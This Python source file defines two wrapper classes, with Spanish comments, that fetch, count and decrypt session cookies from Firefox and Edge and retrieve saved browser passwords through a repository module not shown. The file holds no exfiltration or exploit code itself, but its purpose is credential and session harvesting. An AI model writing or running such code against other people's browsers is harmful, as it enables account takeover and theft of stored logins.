from repositories.cookie_repository import CookieRepository_Firefox, CookieRepository_Edge


class CookieService_Firefox:
    def __init__(self):
        self.repository = CookieRepository_Firefox()

    # Obtner las cookies de firefox
    def get_firefox_cookies(self):
        return self.repository.get_firefox_cookies()

    # Obtner las cookies de session de firefox
    def get_session_cookies(self):
        return self.repository.get_firefox_cookies_session()

    # Contar las cookies de session de firefox
    def count_session_cookies(self):
        return self.repository.count_firefox_cookies_session()

    # Desencriptar cookies de firefox
    def decrypt_firefox(self, encrypted_value):
        return self.repository.decrypt_firefox(encrypted_value)

    def obtener_contrasenias(self):
        return self.repository.obtener_contrasenias()


class CookieService_Edge:
    def __init__(self):
        self.repository = CookieRepository_Edge()

    # Obtner las cookies de edge
    def get_edge_cookies(self):
        return self.repository.get_edge_cookies()

    # Obtner las cookies de session de edge
    def get_session_cookies(self):
        return self.repository.get_edge_cookies_session()

    # Contar las cookies de session de edge
    def count_session_cookies(self):
        return self.repository.count_edge_cookies_session()

    def obtener_usuario_contrasenia(self):
        return self.repository.obtener_contrasenias()
